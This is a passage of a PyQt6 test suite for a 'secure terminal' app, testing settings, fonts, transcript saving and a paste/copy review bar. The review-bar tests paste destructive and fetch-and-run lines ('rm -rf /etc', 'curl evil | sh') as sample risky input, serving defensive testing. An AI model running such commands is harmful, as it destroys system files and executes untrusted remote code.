    # MULTI-SIZE icon -- a bare QIcon(<svg path>) reports no availableSizes(), so Qt's X11
    # _NET_WM_ICON export emits nothing and the window/taskbar icon silently vanishes to the
    # WM default. (Real os.path.exists here, so it resolves the checkout SVG; needs the
    # qt6-svg-plugins image plugin, a pinned test dep.)
    _svg_app_icon = _REAL_APP_ICON()
    ok(not _svg_app_icon.isNull(),
       '_app_icon: resolves the shipped SVG when the theme has no icon')
    ok(len(_svg_app_icon.availableSizes()) > 0,
       '_app_icon: SVG fallback carries concrete sizes so _NET_WM_ICON is exported')
    _o_exists = os.path.exists
    try:
        os.path.exists = lambda path: True          # a shipped icon path is present
        ok(_REAL_APP_ICON() is not None,
           '_app_icon: loads the shipped SVG by path when no theme icon exists')
        os.path.exists = lambda path: False
        ok(_REAL_APP_ICON().isNull(), '_app_icon: a null icon when nothing is found')
    finally:
        os.path.exists = _o_exists
finally:
    QIcon.fromTheme = _o_fromtheme

# --- _apply_global keeps locked keys at their admin value ----------------------
_sl2 = set(win._locked)
try:
    win._locked = {'tui', 'colors', 'osc_notice', 'unicode_mode', 'osc_title',
                   'font_family'}
    win._default_font_family = 'Hack'
    win._apply_global({'theme': 'dark', 'zoom': 100, 'mode': 'box',
                       'font_family': 'Attacker Font', 'font_size': 20,
                       'colors': True, 'line_edits': True, 'tui': True, 'osc_notice': True,
                       'tui_autobox_notice': True,
                       'osc': {'osc_title': True}, 'scrollback': 1000,
                       'paste_delay': 3, 'escape_limit': 4096, 'persist': False})
    ok(win._default_font_family == 'Hack',
       '_apply_global preserves admin-locked keys (incl. a locked font_family)')
finally:
    win._locked = _sl2

# --- save_transcript to an unwritable path WARNS the user (never silent) -------
from PyQt6.QtWidgets import QFileDialog as _QFD3, QMessageBox as _QMB3   # noqa: E402
_o_gsf = _QFD3.getSaveFileName
_o_warn3 = _QMB3.warning
_warned3 = []
try:
    _QFD3.getSaveFileName = staticmethod(
        lambda *_a, **_k: ('/proc/nonexistent-dir/x.txt', ''))
    _QMB3.warning = staticmethod(lambda *_a, **_k: _warned3.append(_a))
    win.save_transcript()                   # open() raises OSError -> warns, not silent
    ok(bool(_warned3) and any('/proc/nonexistent-dir/x.txt' in str(_a) for _a in _warned3),
       'save_transcript: a failed save warns the user (a denied write never vanishes)')
finally:
    _QFD3.getSaveFileName = _o_gsf
    _QMB3.warning = _o_warn3

# _save_capture falls back to the bare filename when the state dir cannot be made
# (so the dialog still opens rather than crashing on the join).
_o_ens = M.session.ensure_state_dir
_start_args = []
try:
    M.session.ensure_state_dir = staticmethod(
        lambda: (_ for _ in ()).throw(OSError('no state dir')))
    _QFD3.getSaveFileName = staticmethod(
        lambda *_a, **_k: (_start_args.append(_a), ('', ''))[1])
    win.save_transcript()               # empty return path -> no write attempted
    ok(bool(_start_args) and _start_args[0][2] == 'secure-terminal-transcript.txt',
       '_save_capture opens with the bare filename when the state dir is unavailable')
finally:
    _QFD3.getSaveFileName = _o_gsf
    M.session.ensure_state_dir = _o_ens

# copy_transcript_path WARNS when the transcript file cannot be written.
_o_ens2 = M.session.ensure_state_dir
_o_warncp = _QMB3.warning
_warned_cp = []
try:
    M.session.ensure_state_dir = staticmethod(
        lambda: (_ for _ in ()).throw(OSError('no space')))
    _QMB3.warning = staticmethod(lambda *_a, **_k: _warned_cp.append(_a))
    win.copy_transcript_path()
    ok(bool(_warned_cp),
       'copy_transcript_path warns when the transcript file cannot be written')
finally:
    _QMB3.warning = _o_warncp
    M.session.ensure_state_dir = _o_ens2

# copy_transcript_path is a safe no-op when there is no live current tab.
_o_cur_cp = win.current
try:
    win.current = lambda: None
    _dialogs.clear()
    win.copy_transcript_path()
    ok(not _dialogs, 'copy_transcript_path is a no-op (no dialog) with no current tab')
finally:
    win.current = _o_cur_cp

# --- _open_path opens an existing folder and falls back to a parent -----------
# Stub openUrl: offscreen QPA does not spawn, but a direct run under a real desktop
# platform would pop an external file-manager window -- capture the path instead.
_op_opened = []
_op_oou = _QDS.openUrl
try:
    def _spy_open_url_path(url):
        _op_opened.append(url.toLocalFile())
        return True
    _QDS.openUrl = staticmethod(_spy_open_url_path)
    win._open_path('/tmp')                       # exists  # nosec B108 -- known-existing dir to exercise _open_path
    win._open_path('/tmp/no-such-dir-xyz/child') # missing -> parent  # nosec B108 -- missing path exercises the parent-fallback branch
finally:
    _QDS.openUrl = _op_oou
ok(len(_op_opened) == 2 and _op_opened[0] == '/tmp',  # nosec B108 -- '/tmp' is an expected-value string in an assertion, not a temp path
   '_open_path opens the folder, and a missing path falls back to a parent')

# --- the font-noise message handler drops the flood, passes real messages -----
from PyQt6.QtCore import qWarning                                # noqa: E402
import io as _io_fn                                              # noqa: E402
M._quiet_font_warnings()
_fn_sink = _io_fn.StringIO()
_fn_orig_stderr = sys.stderr
sys.stderr = _fn_sink                                  # the handler writes real msgs here
try:
    qWarning('OpenType support missing for "Something"')   # font noise -> dropped
    qWarning('a genuine warning')                          # real -> passed through
finally:
    sys.stderr = _fn_orig_stderr
_fn_out = _fn_sink.getvalue()
ok('genuine warning' in _fn_out and 'OpenType support missing' not in _fn_out,
   'the font-noise handler drops font noise and passes real messages (sink capture)')

# --- main(): a SIGCHLD-install failure during startup is tolerated ------------
_o_argv3 = sys.argv[:]
_o_sr4 = M.ipc.send_request
_o_qa3 = M.QApplication
_o_qexec3 = QApplication.exec
import signal as _sig3                                           # noqa: E402
_o_sig = _sig3.signal
_o_chld3 = _sig3.getsignal(_sig3.SIGCHLD)
try:
    M.ipc.send_request = lambda *_a, **_k: None


    class _AP3:
        def __call__(self, _a):
            return APP

        def __getattr__(self, _n):
            return getattr(QApplication, _n)

    M.QApplication = _AP3()
    M.QFontDatabase = _FontDBPresent    # startup is font-independent here
    QApplication.exec = lambda _s: 0

    def _sig_maybe_raise(signum, handler):
        if signum == _sig3.SIGCHLD:
            raise ValueError('cannot set SIGCHLD here')
        return _o_sig(signum, handler)

    _sig3.signal = _sig_maybe_raise
    sys.argv = ['secure-terminal', '--new-instance']
    eq(M.main(), 0, 'main: a SIGCHLD-install failure during startup is tolerated')
finally:
    _sig3.signal = _o_sig
    sys.argv = _o_argv3
    M.ipc.send_request = _o_sr4
    M.QApplication = _o_qa3
    M.QFontDatabase = _REAL_QFONTDB
    QApplication.exec = _o_qexec3
    _sig3.signal(_sig3.SIGCHLD, _o_chld3)

# F5: the module-level SIGCHLD handler delegates to SecureTerminal.reap_pty_children --
# reaping only our own pty children, never a subprocess child -- so it replaces the
# returncode-defanging SIGCHLD=SIG_IGN. It ignores its (signum, frame) args.
M._reap_pty_children(_sig3.SIGCHLD, None)
ok(True, '_reap_pty_children handler runs without error')

# --- set_font_family / choose_font: the per-tab font picker -------------------
from PyQt6.QtGui import QFont as _QFont                          # noqa: E402
from PyQt6.QtWidgets import QFontDialog as _QFontDialog          # noqa: E402
if win.tabs.count() == 0:
    win.new_tab()
win.set_font_family('DejaVu Sans Mono')         # normal path: apply + persist
eq(win._default_font_family, 'DejaVu Sans Mono',
   'set_font_family sets the tab family and the new-tab default')
win.set_font_family('')                          # empty -> falls back to the default
ok(win._default_font_family, 'set_font_family: an empty family falls back to the default')
_sfl = set(win._locked)
try:
    win._locked = {'font_family'}
    _before = win._default_font_family
    win.set_font_family('Ignored')               # admin-locked -> early return
    eq(win._default_font_family, _before,
       'set_font_family: an admin-locked family is not changed')
finally:
    win._locked = _sfl

# font_size from config: a valid value is honoured; a bad one falls back to the base
import secure_terminal.settings as _setmod_fs                     # noqa: E402
from secure_terminal.settings import Config as _Cfg_fs            # noqa: E402
from secure_terminal.terminal import BASE_POINT_SIZE as _BPS_fs   # noqa: E402
_o_load_fs = _setmod_fs.load
_base_cfg_fs = _o_load_fs()


def _cfg_with(**over):
    return _Cfg_fs({**dict(_base_cfg_fs), **over}, _base_cfg_fs.locked,
                   _base_cfg_fs.violations)


try:
    _setmod_fs.load = lambda: _cfg_with(font_size='16', ui_scale='150',
                                        font_family='DejaVu Sans Mono')
    _wfs = MainWindow()
    eq(_wfs._default_font_size, 16, 'font_size read from config (valid int)')
    eq(_wfs._default_font_family, 'DejaVu Sans Mono', 'font_family read from config')
    eq(_wfs._ui_scale, 150, 'ui_scale (menu size) read from config (valid int)')
    _setmod_fs.load = lambda: _cfg_with(font_size='not-a-number')
    _wfs2 = MainWindow()
    eq(_wfs2._default_font_size, _BPS_fs,
       'an invalid font_size falls back to the base point size')
finally:
    _setmod_fs.load = _o_load_fs

# the global-settings dialog now carries the paste/copy REVIEW level; _apply_global
# stores it and applies it to every open tab.
_pw_save, _cw_save = win._paste_warn, win._copy_warn
try:
    win._apply_global({'theme': 'dark', 'zoom': 100,
                       'font_family': win._default_font_family,
                       'font_size': win._default_font_size, 'mode': 'box',
                       'colors': True, 'line_edits': True, 'tui': False,
                       'osc': {}, 'osc_notice': True, 'tui_autobox_notice': True,
                       'scrollback': 0, 'paste_delay': 3, 'escape_limit': 4096,
                       'paste_warn': 'always', 'copy_warn': 'never', 'persist': False})
    eq((win._paste_warn, win._copy_warn), ('always', 'never'),
       '_apply_global stores the paste/copy review levels')
    ok(all(t.current_paste_warn() == 'always' and t.current_copy_warn() == 'never'
           for t in win._real_terms()),
       '_apply_global applies the paste/copy review levels to every open tab')
finally:
    win._paste_warn, win._copy_warn = _pw_save, _cw_save

# UI (menu) scale: _select_labels enlarges a dialog's font for readability; the base
# point size is captured once so a re-scaled fresh dialog never compounds, and a
# scale of 100 is a no-op.
from secure_terminal.main import _select_labels as _sel_scale     # noqa: E402
from PyQt6.QtWidgets import QDialog as _QDlgScale                  # noqa: E402
_probe_dlg = _QDlgScale()
_probe_before = _probe_dlg.font().pointSizeF()
_sel_scale(_probe_dlg, 150)
ok(_probe_dlg.font().pointSizeF() > _probe_before or _probe_before <= 0,
   '_select_labels(scale=150) enlarges the dialog font (menu zoom)')
_probe_dlg2 = _QDlgScale()
_pb2 = _probe_dlg2.font().pointSizeF()
_sel_scale(_probe_dlg2, 100)
eq(_probe_dlg2.font().pointSizeF(), _pb2,
   '_select_labels(scale=100) leaves the dialog font unchanged')
_us_save = win._ui_scale
try:
    win._apply_global({'theme': 'dark', 'zoom': 100,
                       'font_family': win._default_font_family,
                       'font_size': win._default_font_size, 'ui_scale': 175,
                       'mode': 'box', 'colors': True, 'line_edits': True, 'tui': False, 'osc': {},
                       'osc_notice': True, 'tui_autobox_notice': True,
                       'scrollback': 0, 'paste_delay': 3, 'escape_limit': 4096,
                       'persist': False})
    eq(win._ui_scale, 175, '_apply_global stores the menu (UI) scale')
finally:
    win._ui_scale = _us_save

_o_getfont = _QFontDialog.getFont
try:
    _QFontDialog.getFont = staticmethod(
        lambda *_a, **_k: (_QFont('DejaVu Sans Mono'), True))
    win.choose_font()                            # accepted -> set_font_family
    ok(win._default_font_family == 'DejaVu Sans Mono',
       'choose_font: an accepted pick applies the family')
    _QFontDialog.getFont = staticmethod(lambda *_a, **_k: (_QFont('X'), False))
    win.choose_font()                            # cancelled -> no change
    ok(win._default_font_family == 'DejaVu Sans Mono',
       'choose_font: a cancelled pick leaves the family unchanged')
finally:
    _QFontDialog.getFont = _o_getfont

# choose_font with no current tab returns before the dialog
_nf3 = MainWindow()
while _nf3.tabs.count():
    _nf3.tabs.removeTab(0)
_nf3.choose_font()                               # no tab -> return
ok(True, 'choose_font: no current tab -> returns before the dialog')
_nf3.deleteLater()
APP.processEvents()

# choose_font: a Qt build without the MonospacedFonts option falls back to no
# options (the defensive AttributeError branch)
_o_qfd = M.QFontDialog
try:
    class _FakeFDO:
        def __getattr__(self, _n):
            raise AttributeError(_n)             # .MonospacedFonts -> AttributeError

        def __call__(self, _n):
            return 0

    class _FakeFontDialog:
        FontDialogOption = _FakeFDO()

        @staticmethod
        def getFont(*_a, **_k):
            return (_QFont('DejaVu Sans Mono'), True)

    M.QFontDialog = _FakeFontDialog
    win.choose_font()                            # MonospacedFonts missing -> fallback opts
    ok(True, 'choose_font: a missing MonospacedFonts option falls back to no options')
finally:
    M.QFontDialog = _o_qfd

# --- set_paste_warn / set_copy_warn: valid modes applied to every tab ----------
win.set_paste_warn('always')
eq(win._paste_warn, 'always', 'set_paste_warn applies the chosen mode')
win.set_copy_warn('always')
eq(win._copy_warn, 'always', 'set_copy_warn applies the chosen mode')
win.set_paste_warn('bogus')                      # invalid -> ignored
eq(win._paste_warn, 'always', 'set_paste_warn: an invalid mode is ignored')
win.set_copy_warn('unicode')
win.set_paste_warn('unicode')
_pw_term = win.current()
ok(_pw_term.current_paste_warn() == 'unicode'
   and _pw_term.current_copy_warn() == 'unicode',
   'set_paste_warn / set_copy_warn push the mode to every tab (tab-level read-back)')

# --- review risk lamp (#116): reflects the config and goes red on unreviewed risk
from PyQt6.QtWidgets import QDialog as _QDlgSec                    # noqa: E402
_pw0, _cw0, _ur0 = win._paste_warn, win._copy_warn, win._unreviewed_risk
try:
    win.set_paste_warn('unicode')
    win.set_copy_warn('unicode')
    win._unreviewed_risk = False
    eq(win._review_level()[0], '#1f8a54',
       'review lamp is green when both directions are reviewed')
    win.set_paste_warn('never')
    eq(win._review_level()[0], '#e5a50a',
       "review lamp is yellow when a direction's review is off")
    win._on_unreviewed_risk()
    ok(win._unreviewed_risk and win._review_level()[0] == '#e5484d',
       'unreviewed risk lights the review lamp red')
    win._on_unreviewed_risk()                    # already red -> stays red, no error
    _osec = _QDlgSec.exec
    _QDlgSec.exec = lambda _self: int(_QDlgSec.DialogCode.Accepted)
    try:
        win._show_security_details()             # acknowledging clears the red
    finally:
        _QDlgSec.exec = _osec
    ok(not win._unreviewed_risk,
       'opening the security details acknowledges and clears the red review lamp')
finally:
    win.set_paste_warn(_pw0)
    win.set_copy_warn(_cw0)
    win._unreviewed_risk = _ur0

# --- the paste/copy review bar: _show_review / _hide_paste_review --------------
from secure_terminal.terminal import SecureTerminal as _ST2      # noqa: E402
if win.tabs.count() == 0:
    win.new_tab()
_rvterm = win.current()
win._show_review(_rvterm, 'risky text', 0, 'paste')   # current tab -> bar shown
ok(win._review_bar.reviewed_term() is _rvterm,
   '_show_review shows the review bar for the active tab')
win._hide_paste_review(_rvterm)                        # current tab -> refocus
# a request from a NON-current tab is ignored (its text stays held)
_bgterm = _ST2(command='/bin/cat')
win._show_review(_bgterm, 'held', 0, 'copy')           # not current -> return
ok(win._review_bar.reviewed_term() is not _bgterm,
   '_show_review ignores a background tab (the bar is not shown for it)')
win._hide_paste_review(_bgterm)                        # not current -> no refocus
_bgterm.shutdown()

# #2 cross-tab strand: ONE review bar is shared across tabs, so resolving tab A's
# review must NOT tear down a review the bar has since been re-shown for tab B.
# CANARY: the old _hide_paste_review hid the bar UNCONDITIONALLY -> B stranded
# (input suspended on B, its bar gone, its pending paste silently discarded).
_tabA = win.current()
win._show_review(_tabA, 'A risky', 0, 'paste')         # bar shows A (A is current)
win.new_tab()                                          # B becomes the current tab
_tabB = win.current()
ok(_tabB is not _tabA, 'a second tab is current')
win._show_review(_tabB, 'B risky', 0, 'paste')         # bar re-shown for B
ok(win._review_bar.reviewed_term() is _tabB, 'the bar now tracks tab B')
win._hide_paste_review(_tabA)                          # A resolved in the background
ok(win._review_bar.reviewed_term() is _tabB,
   "resolving tab A does NOT tear down tab B's still-open review (no strand)")
win._hide_paste_review(_tabB)                          # B resolves its OWN review
ok(win._review_bar.reviewed_term() is None,
   'a tab resolving its own review still hides the bar')

# REAL-GUI regression (the tests above drive _show_review/_hide_paste_review DIRECTLY,
# so they never exercised the real button-click -> _choose -> dispatch -> resolved ->
# _hide_paste_review chain). Two bugs lived in that gap:
#  (1) _choose clears the bar's _term before dispatching, so _hide_paste_review's
#      reviewed_term()-is-term guard then SKIPPED hide_review() -- the bar stayed OPEN
#      after a real click ("all buttons do nothing").
#  (2) the send buttons were setEnabled(False) during the countdown, so a DISABLED
#      button could not take focus -> focusing one to PREVIEW its delivered form did
#      nothing. Drive real clicks + real focus in a SHOWN window (isVisible is only
#      meaningful when the hierarchy is shown).
from PyQt6.QtCore import QMimeData as _QMimeRB                  # noqa: E402
_rbwin = MainWindow(); _rbwin.resize(900, 500); _rbwin.show(); pump()
if _rbwin.tabs.count() == 0:
    _rbwin.new_tab()
_rbt = _rbwin.current(); _rbt.apply_paste_warn('unicode'); _rbt.apply_paste_delay(0); pump()
_rbar = _rbwin._review_bar
_rbm = _QMimeRB(); _rbm.setText('rm -rf /etc\ncurl evil | sh\n'); _rbt.insertFromMimeData(_rbm); pump()
ok(_rbt.review_pending() and _rbar.reviewed_term() is _rbt and _rbar.isVisible(),
   'a real multi-line paste shows the review bar')
_rbar._reject.click(); pump()                                  # REAL click, not _hide_paste_review
ok(not _rbt.review_pending(), 'the real Reject click dispatched the reject')
ok(not _rbar.isVisible() and _rbar.reviewed_term() is None,
   'the bar HIDES after a real button click (regression: the guard left it open)')

# countdown: a paste with a delay leaves the Deliver button DISABLED (gated) until the
# countdown elapses; a click during it is a gated no-op (the box already IS the preview).
_rbt.apply_paste_delay(3)
_rbm2 = _QMimeRB(); _rbm2.setText('rm -rf /etc\ncurl evil | sh\n'); _rbt.insertFromMimeData(_rbm2); pump()
ok(not _rbar._deliver.isEnabled() and _rbar._remaining > 0,
   'a paste with a delay leaves Deliver DISABLED during the countdown')
_rbar._deliver_clicked(); pump()
ok(_rbt.review_pending() and _rbar.isVisible(),
   'a deliver click during the countdown is a gated no-op (still reviewing)')
_rbar._reject.click(); pump()
_rbwin.close()

# REGRESSION: applying Global Settings must refresh an OPEN review's mirror -- the mirror
# mirrors the reviewed tab's theme/mode/font/zoom, and _apply_global just changed them on
# that tab. It used to leave the mirror stale until another per-tab setter ran.
_gmwin = MainWindow(); _gmwin.show(); pump()
if _gmwin.tabs.count() == 0:
    _gmwin.new_tab()
_gmt = _gmwin.current(); _gmt.apply_paste_warn('unicode'); pump()
_gm_calls = []
_gmwin._review_bar.rerender_mirror = lambda *a: _gm_calls.append(1)
_gmm = _QMimeRB(); _gmm.setText('rm -rf /\ncurl x\n'); _gmt.insertFromMimeData(_gmm); pump()
_gm_calls.clear()                                      # ignore the show_review render
_gmwin._apply_global({'theme': 'light', 'zoom': 100, 'mode': 'box', 'colors': True,
                      'line_edits': True, 'scrollback': 1000, 'paste_delay': 3,
                      'escape_limit': 4096, 'persist': False})
ok(bool(_gm_calls),
   'applying Global Settings refreshes an open review mirror (rerender_mirror called)')
_gmwin.close()

# --- app.aboutToQuit teardown: shuts every window's tabs, tolerating a raise ---
# The full-startup main() runs above connected _shutdown_all_tabs to
# app.aboutToQuit; fire it with a tab whose shutdown() raises to drive the
# best-effort guard (the except that must never block quit). Kept in this suite
# (not the CLASH suite) BECAUSE the handler only exists once main() has run here.
_teardown_win = MainWindow()
_teardown_win.new_tab()


def _raise_shutdown():
    raise RuntimeError('shutdown blew up')


_teardown_win.tabs.widget(0).shutdown = _raise_shutdown
APP.aboutToQuit.emit()
ok(True, 'aboutToQuit teardown shuts down every tab and tolerates a failing shutdown')
_teardown_win.deleteLater()
APP.processEvents()


finish('mainwin4')
